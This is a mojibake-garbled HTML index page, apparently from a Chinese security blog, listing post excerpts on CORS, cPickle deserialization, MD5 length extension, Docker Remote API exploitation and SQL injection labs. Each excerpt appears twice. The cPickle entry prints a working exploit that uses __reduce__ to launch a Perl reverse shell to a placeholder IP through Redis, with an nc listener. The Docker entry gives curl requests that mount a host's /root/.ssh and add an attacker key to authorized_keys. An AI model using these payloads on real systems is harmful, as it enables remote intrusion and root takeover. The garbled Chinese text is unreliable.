<li>Access-Control-Allow-Originï¼šé™åˆ¶è¿™ä¸ªè¯·æ±‚èƒ½ä»å“ªäº›URIè®¿é—®ã€‚</li>
</ul>
<blockquote>
<p>åœ¨ä½¿ç”¨è¿™ä¸ªè¯·æ±‚ï¼Œä½¿ç”¨AJAXæ—¶ï¼Œè¢«è°ƒç”¨æ–¹éœ€è¦è¾“å‡ºè¿™ä¸ªå¤´ï¼ŒæŒ‡åå¯ä»¥ä»å“ªä¸ªç½‘ç«™ è®¿é—®ï¼Œå¦‚æœæœªè¾“å‡ºè¿™ä¸ªå¤´ï¼Œåªå…è®¸åŒåŸŸåçš„è®¿é—®ã€‚</p>
</blockquote>
<ul>
<li>Access-Control-Allow-Credentials: å…è®¸è¿™ä¸ªè¯·æ±‚ä½¿ç”¨cookieã€‚</li>
</ul>
<blockquote>
<p>ä¸€èˆ¬è·¨åŸŸæƒ…å†µä¸‹ï¼ŒAJAXä¸ä¼šé™„å¸¦ç”¨æˆ·çš„Cookieï¼Œä¹Ÿä¸å…è®¸è®¾ç½®ç”¨æˆ·çš„Cookieï¼Œè¦ä½¿ç”¨è¿™ä¸ªçš„è¯ï¼Œé¦–å…ˆCåœ¨æ„é€ è¿™ä¸ªXMLHTTPRequestå¯¹è±¡æ—¶ï¼Œéœ€è¦è®¾ç½®withCredentialså±æ€§ã€‚</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">XMLHttpRequest:

var xhr &#x3D; new XMLHttpRequest();
xhr.open(&#39;GET&#39;, url, true);
xhr.withCredentials &#x3D; true;
xhr.onreadystatechange &#x3D; handler;
xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2016/08/29/csrf.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/07/26/python-cpickle-shell.html" >Python cPickle ååºåˆ—åŒ–shell</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-07-26  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>åˆ©ç”¨Python cPickleååºåˆ—åŒ–åå¼¹shellï¼Œä¸»è¦åˆ©ç”¨cPicleçš„<code>__reduce__</code>ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œï¼Œå®˜æ–¹æ–‡æ¡£æœ‰å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
</blockquote>
<p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
<p> <code>__reduce__</code>çš„è¿”å›å€¼ï¼Œç¬¬ä¸€ä¸ªä½œä¸º<code>callable object</code>ï¼Œç¬¬äºŒä¸ªä½œä¸ºå‚æ•°è°ƒç”¨ï¼Œæ‰€ä»¥å¯ä»¥æœ‰å¦‚ä¸‹åå¼¹shellçš„æ–¹æ³•:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
import cPickle
import os
import redis

class exp(object):
    def __reduce__(self):
        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;
        return (os.system, (s,))
   
e &#x3D; exp()
s &#x3D; cPickle.dumps(e)

r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)
r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ‰§è¡Œä¹‹åï¼Œå‘ç›®æ ‡IPå†™å…¥keyä¸ºb026324c6904b2a9cb4b88d6d61c81d1ï¼Œå…¶å€¼æ˜¯åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œ__reduce__å‡½æ•°å¯ä»¥åå¼¹shellçš„sessionã€‚<br>åå¼¹shellæŒ‡å®šç«¯å£ <code>nc -l -vv -p 443</code><br>ç„¶ååˆ°redisé¡µé¢è®¾ç½®session_idï¼Œåˆ·æ–°ä¹‹åå³å¯åå¼¹ã€‚</p>

	

	</div>
  <a type="button" href="/2016/07/26/python-cpickle-shell.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>åˆ©ç”¨Python cPickleååºåˆ—åŒ–åå¼¹shellï¼Œä¸»è¦åˆ©ç”¨cPicleçš„<code>__reduce__</code>ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œï¼Œå®˜æ–¹æ–‡æ¡£æœ‰å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
</blockquote>
<p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
<p> <code>__reduce__</code>çš„è¿”å›å€¼ï¼Œç¬¬ä¸€ä¸ªä½œä¸º<code>callable object</code>ï¼Œç¬¬äºŒä¸ªä½œä¸ºå‚æ•°è°ƒç”¨ï¼Œæ‰€ä»¥å¯ä»¥æœ‰å¦‚ä¸‹åå¼¹shellçš„æ–¹æ³•:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
import cPickle
import os
import redis

class exp(object):
    def __reduce__(self):
        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;
        return (os.system, (s,))
   
e &#x3D; exp()
s &#x3D; cPickle.dumps(e)

r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)
r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ‰§è¡Œä¹‹åï¼Œå‘ç›®æ ‡IPå†™å…¥keyä¸ºb026324c6904b2a9cb4b88d6d61c81d1ï¼Œå…¶å€¼æ˜¯åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œ__reduce__å‡½æ•°å¯ä»¥åå¼¹shellçš„sessionã€‚<br>åå¼¹shellæŒ‡å®šç«¯å£ <code>nc -l -vv -p 443</code><br>ç„¶ååˆ°redisé¡µé¢è®¾ç½®session_idï¼Œåˆ·æ–°ä¹‹åå³å¯åå¼¹ã€‚</p>

	
	</div>
  <a type="button" href="/2016/07/26/python-cpickle-shell.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/07/25/hash-length-attack.html" >MD5å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-07-25  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p>
</blockquote>
<p>è¿™ç¯‡æ–‡ç« é‡Œæœ‰æåˆ°çš„å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»çœ‹äº†ä¸‹åšä¸ªç¬”è®°ã€‚ç†è§£å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ä»¥md5ä¸ºä¾‹ï¼Œéœ€è¦ç†è§£ä¸‹é¢å‡ ç‚¹ï¼š</p>
<h3 id="MD5çš„éƒ¨åˆ†å·¥ä½œåŸç†"><a href="#MD5çš„éƒ¨åˆ†å·¥ä½œåŸç†" class="headerlink" title="MD5çš„éƒ¨åˆ†å·¥ä½œåŸç†"></a>MD5çš„<strong>éƒ¨åˆ†å·¥ä½œåŸç†</strong></h3><h4 id="ä¸€-å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š"><a href="#ä¸€-å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š" class="headerlink" title="ä¸€. å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š"></a>ä¸€. å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š</h4><p> å¯¹äºä¸€ä¸ªmessageè¿›è¡Œmd5è®¡ç®—çš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š<br> ç»è¿‡ä¸‰ä¸ªæ­¥éª¤ï¼Œè¿™éƒ¨åˆ†å¯ä»¥çœ‹<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1321">RFC</a>:</p>
<p> The message is â€œpaddedâ€ (extended) so that its length (in bits) is congruent to 448, modulo 512.<br>   å…ˆè¿›è¡Œè¡¥ä½ï¼Œä½¿å¾—æ•´ä½“é•¿åº¦å¯¹512å–æ¨¡ä¹‹åçš„å€¼ä¸º448ï¼Œlen(message)%512 == 418ï¼Œè®¡ç®—å•ä½æ˜¯bitï¼ˆä½ï¼‰ã€‚</p>
<ol>
<li><p>Append Padding Bits</p>
<p> è¡¥ä½æ˜¯è¿™æ ·çš„ï¼Œå…ˆåœ¨messageåé¢åŠ 0x80æ ‡è¯†ï¼Œç„¶ååŠ æ— é™ä¸ª0ï¼Œä¸€ç›´æ»¡è¶³å¯¹512bitå–æ¨¡ä¹‹åç­‰äº448bitã€‚</p>
</li>
<li><p>Append Length</p>
<p> 512bitå’Œ448ç›¸å·®64bitï¼Œå³8Byteï¼Œè¿™ä¸ª8å­—èŠ‚ç”¨æ¥è¡¨ç¤ºè¡¥ä½ä¹‹å‰messageçš„é•¿åº¦ã€‚</p>
</li>
<li><p>è®¡ç®—æ¶ˆæ¯æ‘˜</p>
<p>æœ‰ä¸€ä¸ªåˆå§‹é“¾å˜é‡ï¼Œç”¨æ¥å‚ä¸ç¬¬ä¸€è½®çš„è¿ç®—ï¼ŒMD5çš„åˆå§‹å˜é‡ä¸ºï¼š<br>A = 0x67452301<br>B = 0xefcdab89<br>C = 0x98badcfe<br>D = 0x10325476</p>
</li>
</ol>
<p> æ•´ä½“æ¥è¯´å°±æ˜¯å…ˆè¡¥ä½ï¼Œç„¶åè¡¥é•¿åº¦ï¼Œè¿™ä¸ªé•¿åº¦å 8Byteï¼Œç”¨æ¥è¡¨ç¤ºè¡¥ä½ä¹‹å‰messageçš„é•¿åº¦ï¼Œç„¶åè®¡ç®—md5ã€‚ç°åœ¨è®°ä½ä¸‹é¢è¿™å¥è¯ï¼š</p>
<blockquote>
<p>æ¯ç»è¿‡ä¸€æ¬¡æ¶ˆæ¯æ‘˜è¦è®¡ç®—ï¼Œä¸Šé¢çš„<strong>é“¾å˜é‡ä¼šè¢«æ–°çš„å€¼è¦†ç›–</strong>ï¼Œæœ€åä¸€è½®ç»è¿‡é«˜ä½ä½äº’æ¢ï¼ˆaabbccdd -&gt; ddccbbaaï¼‰å°±æ˜¯æœ€ç»ˆçš„MD5å€¼ã€‚</p>
</blockquote>
<p>ç°åœ¨æ¥è¿›è¡Œmd5æ‰©å±•é•¿åº¦æ”»å‡»ï¼š<br>æˆ‘è§‰å¾—ç›´æ¥æŠŠè¿™ä¸ªçœ‹å®Œå°±å·®ä¸å¤šäº†ï¼š<a target="_blank" rel="noopener" href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>
	

	</div>
  <a type="button" href="/2016/07/25/hash-length-attack.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p>
</blockquote>
<p>è¿™ç¯‡æ–‡ç« é‡Œæœ‰æåˆ°çš„å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»çœ‹äº†ä¸‹åšä¸ªç¬”è®°ã€‚ç†è§£å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ä»¥md5ä¸ºä¾‹ï¼Œéœ€è¦ç†è§£ä¸‹é¢å‡ ç‚¹ï¼š</p>
<h3 id="MD5çš„éƒ¨åˆ†å·¥ä½œåŸç†"><a href="#MD5çš„éƒ¨åˆ†å·¥ä½œåŸç†" class="headerlink" title="MD5çš„éƒ¨åˆ†å·¥ä½œåŸç†"></a>MD5çš„<strong>éƒ¨åˆ†å·¥ä½œåŸç†</strong></h3><h4 id="ä¸€-å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š"><a href="#ä¸€-å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š" class="headerlink" title="ä¸€. å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š"></a>ä¸€. å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š</h4><p> å¯¹äºä¸€ä¸ªmessageè¿›è¡Œmd5è®¡ç®—çš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š<br> ç»è¿‡ä¸‰ä¸ªæ­¥éª¤ï¼Œè¿™éƒ¨åˆ†å¯ä»¥çœ‹<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1321">RFC</a>:</p>
<p> The message is â€œpaddedâ€ (extended) so that its length (in bits) is congruent to 448, modulo 512.<br>   å…ˆè¿›è¡Œè¡¥ä½ï¼Œä½¿å¾—æ•´ä½“é•¿åº¦å¯¹512å–æ¨¡ä¹‹åçš„å€¼ä¸º448ï¼Œlen(message)%512 == 418ï¼Œè®¡ç®—å•ä½æ˜¯bitï¼ˆä½ï¼‰ã€‚</p>
<ol>
<li><p>Append Padding Bits</p>
<p> è¡¥ä½æ˜¯è¿™æ ·çš„ï¼Œå…ˆåœ¨messageåé¢åŠ 0x80æ ‡è¯†ï¼Œç„¶ååŠ æ— é™ä¸ª0ï¼Œä¸€ç›´æ»¡è¶³å¯¹512bitå–æ¨¡ä¹‹åç­‰äº448bitã€‚</p>
</li>
<li><p>Append Length</p>
<p> 512bitå’Œ448ç›¸å·®64bitï¼Œå³8Byteï¼Œè¿™ä¸ª8å­—èŠ‚ç”¨æ¥è¡¨ç¤ºè¡¥ä½ä¹‹å‰messageçš„é•¿åº¦ã€‚</p>
</li>
<li><p>è®¡ç®—æ¶ˆæ¯æ‘˜</p>
<p>æœ‰ä¸€ä¸ªåˆå§‹é“¾å˜é‡ï¼Œç”¨æ¥å‚ä¸ç¬¬ä¸€è½®çš„è¿ç®—ï¼ŒMD5çš„åˆå§‹å˜é‡ä¸ºï¼š<br>A = 0x67452301<br>B = 0xefcdab89<br>C = 0x98badcfe<br>D = 0x10325476</p>
</li>
</ol>
<p> æ•´ä½“æ¥è¯´å°±æ˜¯å…ˆè¡¥ä½ï¼Œç„¶åè¡¥é•¿åº¦ï¼Œè¿™ä¸ªé•¿åº¦å 8Byteï¼Œç”¨æ¥è¡¨ç¤ºè¡¥ä½ä¹‹å‰messageçš„é•¿åº¦ï¼Œç„¶åè®¡ç®—md5ã€‚ç°åœ¨è®°ä½ä¸‹é¢è¿™å¥è¯ï¼š</p>
<blockquote>
<p>æ¯ç»è¿‡ä¸€æ¬¡æ¶ˆæ¯æ‘˜è¦è®¡ç®—ï¼Œä¸Šé¢çš„<strong>é“¾å˜é‡ä¼šè¢«æ–°çš„å€¼è¦†ç›–</strong>ï¼Œæœ€åä¸€è½®ç»è¿‡é«˜ä½ä½äº’æ¢ï¼ˆaabbccdd -&gt; ddccbbaaï¼‰å°±æ˜¯æœ€ç»ˆçš„MD5å€¼ã€‚</p>
</blockquote>
<p>ç°åœ¨æ¥è¿›è¡Œmd5æ‰©å±•é•¿åº¦æ”»å‡»ï¼š<br>æˆ‘è§‰å¾—ç›´æ¥æŠŠè¿™ä¸ªçœ‹å®Œå°±å·®ä¸å¤šäº†ï¼š<a target="_blank" rel="noopener" href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>
	
	</div>
  <a type="button" href="/2016/07/25/hash-length-attack.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/05/18/docker-remote-exploit.html" >Docker Remote API Exploit</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-05-18  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>Source:</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/15892">http://drops.wooyun.org/papers/15892</a></li>
<li><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/27302">http://zone.wooyun.org/content/27302</a></li>
</ul>
<p>æ˜¨å¤©ä¸‹åˆå’Œä»Šå¤©ä¸Šåˆä¸€èµ·å’Œ@ccståŒå­¦æŸ¥èµ„æ–™è®¨è®ºäº†ä¸‹ï¼Œä»¥ä¸‹æ˜¯ç»“æœï¼š</p>
<p>å¯ä»¥æŒ‰ç…§zoneé‡Œé¢è¯´çš„ï¼Œç›´æ¥ä½¿ç”¨dockeræœ¬åœ°å®¢æˆ·ç«¯è¿›è¡Œshellåå¼¹ï¼Œå®‰è£…docker: <code>curl -sSL https://get.docker.com/ | sh </code>ï¼Œå¦‚æœåœ¨é“¾æ¥çš„æ—¶å€™æç¤ºclientç‰ˆæœ¬é«˜äºæœåŠ¡å™¨ç‰ˆæœ¬å¯ä»¥è¿™æ ·å­:<code>export DOCKER_API_VERSION=1.9.0</code>ï¼Œåé¢çš„ç‰ˆæœ¬è‡ªå·±å®šã€‚</p>
<p>å¦å¤–ä¸€ç§æ–¹æ³•å°±æ˜¯ç›´æ¥ä½¿ç”¨Remote APIï¼ŒæŠŠæœ¬åœ°<code>id_rsa.pub</code>å†™å…¥åˆ°è¿œç¨‹å®¿ä¸»æœºçš„<code>/root/.ssh/authorized_keys</code>ã€‚</p>
<p>å…ˆåˆ›å»º<code>container</code>,åŒæ—¶æŠŠå®¿ä¸»æœºçš„<code>/root/.ssh</code>æŒ‚è½½åˆ°dockerçš„<code>container</code>æŸä¸ªç›®å½•ï¼Œæ¯”å¦‚<code>/tmp</code>:</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span>  -X POST  -H <span class="token string">"Content-Type: application/json"</span>  -d <span class="token string">'&#123; "Cmd": [ "/bin/sh", "-c", " echo \"å…¬é’¥\" >> /tmp/authorized_keys " ], "Image": "sshd", "Volumes": &#123; "/tmp": &#123;&#125; &#125;, "HostConfig": &#123; "Binds": ["/root/.ssh:/tmp:rw"] &#125; &#125; '</span> <span class="token string">"http://10.20.30.40:2375/containers/create"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ä¸Šé¢çš„åˆ›å»ºcreateä¸­çš„<code>Image</code>å¯ä»¥å…ˆè¿œç¨‹æŸ¥çœ‹æœ‰å“ªäº›image: <code>curl -v http://10.20.30.40:2375/images/json</code>ï¼Œè¿™æ ·ä¼šåˆ—å‡ºæ‰€æœ‰çš„<code>image</code>ï¼Œä»å…¶ä¸­è·³å‡ºæ¥ä¸€ä¸ªåƒè¿™æ ·çš„</p>
<p><code>&quot;RepoTags&quot;: [             &quot;nginx:latest&quot;         ],</code> æ³¨æ„<code>nginx</code>åé¢æœ‰ä¸€ä¸ª<code>latest</code>ã€‚åˆ›å»ºçš„æ—¶å€™æŒ‡å®š<code>image</code>ï¼Œå°½å¯èƒ½æ‰¾æœ‰<code>latest</code>çš„imageï¼Œ</p>
<p>ä»¥ä¸Šå‘½ä»¤ä¼šè¿”å›åˆ›å»ºå¥½çš„<code>container</code>çš„<code>id</code>ç„¶åå¯åŠ¨<code>container</code>: <code>curl -X POST http://10.20.30.40:2375/containers/id/start</code></p>
	

	</div>
  <a type="button" href="/2016/05/18/docker-remote-exploit.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>Source:</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/15892">http://drops.wooyun.org/papers/15892</a></li>
<li><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/27302">http://zone.wooyun.org/content/27302</a></li>
</ul>
<p>æ˜¨å¤©ä¸‹åˆå’Œä»Šå¤©ä¸Šåˆä¸€èµ·å’Œ@ccståŒå­¦æŸ¥èµ„æ–™è®¨è®ºäº†ä¸‹ï¼Œä»¥ä¸‹æ˜¯ç»“æœï¼š</p>
<p>å¯ä»¥æŒ‰ç…§zoneé‡Œé¢è¯´çš„ï¼Œç›´æ¥ä½¿ç”¨dockeræœ¬åœ°å®¢æˆ·ç«¯è¿›è¡Œshellåå¼¹ï¼Œå®‰è£…docker: <code>curl -sSL https://get.docker.com/ | sh </code>ï¼Œå¦‚æœåœ¨é“¾æ¥çš„æ—¶å€™æç¤ºclientç‰ˆæœ¬é«˜äºæœåŠ¡å™¨ç‰ˆæœ¬å¯ä»¥è¿™æ ·å­:<code>export DOCKER_API_VERSION=1.9.0</code>ï¼Œåé¢çš„ç‰ˆæœ¬è‡ªå·±å®šã€‚</p>
<p>å¦å¤–ä¸€ç§æ–¹æ³•å°±æ˜¯ç›´æ¥ä½¿ç”¨Remote APIï¼ŒæŠŠæœ¬åœ°<code>id_rsa.pub</code>å†™å…¥åˆ°è¿œç¨‹å®¿ä¸»æœºçš„<code>/root/.ssh/authorized_keys</code>ã€‚</p>
<p>å…ˆåˆ›å»º<code>container</code>,åŒæ—¶æŠŠå®¿ä¸»æœºçš„<code>/root/.ssh</code>æŒ‚è½½åˆ°dockerçš„<code>container</code>æŸä¸ªç›®å½•ï¼Œæ¯”å¦‚<code>/tmp</code>:</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span>  -X POST  -H <span class="token string">"Content-Type: application/json"</span>  -d <span class="token string">'&#123; "Cmd": [ "/bin/sh", "-c", " echo \"å…¬é’¥\" >> /tmp/authorized_keys " ], "Image": "sshd", "Volumes": &#123; "/tmp": &#123;&#125; &#125;, "HostConfig": &#123; "Binds": ["/root/.ssh:/tmp:rw"] &#125; &#125; '</span> <span class="token string">"http://10.20.30.40:2375/containers/create"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ä¸Šé¢çš„åˆ›å»ºcreateä¸­çš„<code>Image</code>å¯ä»¥å…ˆè¿œç¨‹æŸ¥çœ‹æœ‰å“ªäº›image: <code>curl -v http://10.20.30.40:2375/images/json</code>ï¼Œè¿™æ ·ä¼šåˆ—å‡ºæ‰€æœ‰çš„<code>image</code>ï¼Œä»å…¶ä¸­è·³å‡ºæ¥ä¸€ä¸ªåƒè¿™æ ·çš„</p>
<p><code>&quot;RepoTags&quot;: [             &quot;nginx:latest&quot;         ],</code> æ³¨æ„<code>nginx</code>åé¢æœ‰ä¸€ä¸ª<code>latest</code>ã€‚åˆ›å»ºçš„æ—¶å€™æŒ‡å®š<code>image</code>ï¼Œå°½å¯èƒ½æ‰¾æœ‰<code>latest</code>çš„imageï¼Œ</p>
<p>ä»¥ä¸Šå‘½ä»¤ä¼šè¿”å›åˆ›å»ºå¥½çš„<code>container</code>çš„<code>id</code>ç„¶åå¯åŠ¨<code>container</code>: <code>curl -X POST http://10.20.30.40:2375/containers/id/start</code></p>
	
	</div>
  <a type="button" href="/2016/05/18/docker-remote-exploit.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/05/05/sqli-labs-less-16.html" >SQLæŠ¥é”™æ³¨å…¥</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-05-05  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h2 id="æ³¨å…¥çš„æ–¹æ³•"><a href="#æ³¨å…¥çš„æ–¹æ³•" class="headerlink" title="æ³¨å…¥çš„æ–¹æ³•"></a>æ³¨å…¥çš„æ–¹æ³•</h2><p>   <code>sqli-labs</code>çš„1ï¼Œ2ï¼Œ3ï¼Œ4è¯¾éƒ½å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å››ç§æ¥è¿›è¡Œæ³¨å…¥æ•°æ®:</p>
<ul>
<li>Union select</li>
<li>Error based</li>
<li>Blind based</li>
<li>Time blind based</li>
</ul>
<p>   å¯¹åº”çš„å¯ä»¥ä½¿ç”¨<code>sqlmap.py --technique </code>ä¸Šé¢é¦–å­—æ¯å¤§å†™æ¥æŒ‡å®šç›¸åº”çš„æ³¨å…¥ç±»å‹ã€‚</p>
<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>   ç¬¬äº”è¯¾é¦–å…ˆæ’é™¤unionæ³¨å…¥ï¼Œå› ä¸ºé¡µé¢æ— æ³•æ˜¾ç¤ºæ•°æ®ï¼Œæœ€åæˆ‘è¿˜æ˜¯çœ‹äº†ç½‘é¡µæºä»£ç æ‰æ³¨å…¥çš„ã€‚</p>
<blockquote>
<p> æˆ‘å‘ç°sqlmapåœ¨æ¯æ¬¡æ³¨å…¥çš„æ—¶å€™éƒ½ä¼šå…ˆå°è¯•ç¡®å®šå½“å‰å˜é‡æ˜¯è¢«é‚£ç§åŒ…å«ï¼Œç„¶ååœ¨payloadé‡Œé¢é—­åˆï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿æ•´ä¸ªè¯­å¥çš„å®Œæ•´æ€§ã€‚ è¦ä¹ˆç¡®å®šå½“å‰è¯­å¥å®Œå…¨é—­åˆï¼Œè¦ä¹ˆæ³¨é‡Šæ‰åé¢çš„è¯­å¥ï¼Œç¡®ä¿é—­åˆã€‚</p>
</blockquote>
<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>   æŠ¥é”™å’ŒunionæŸ¥è¯¢éƒ½å‡ºä¸äº†æ•°æ®ï¼Œåªèƒ½è¿›è¡Œç›²æ³¨ã€‚bool blindå’Œtime blindã€‚å‰é¢é—­åˆå¯ä»¥ä½¿ç”¨<code>&#39;</code>æˆ–è€…<code>&#39;)</code>ã€‚</p>
<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3>
	

	</div>
  <a type="button" href="/2016/05/05/sqli-labs-less-16.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h2 id="æ³¨å…¥çš„æ–¹æ³•"><a href="#æ³¨å…¥çš„æ–¹æ³•" class="headerlink" title="æ³¨å…¥çš„æ–¹æ³•"></a>æ³¨å…¥çš„æ–¹æ³•</h2><p>   <code>sqli-labs</code>çš„1ï¼Œ2ï¼Œ3ï¼Œ4è¯¾éƒ½å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å››ç§æ¥è¿›è¡Œæ³¨å…¥æ•°æ®:</p>
<ul>
<li>Union select</li>
<li>Error based</li>
<li>Blind based</li>
<li>Time blind based</li>
</ul>
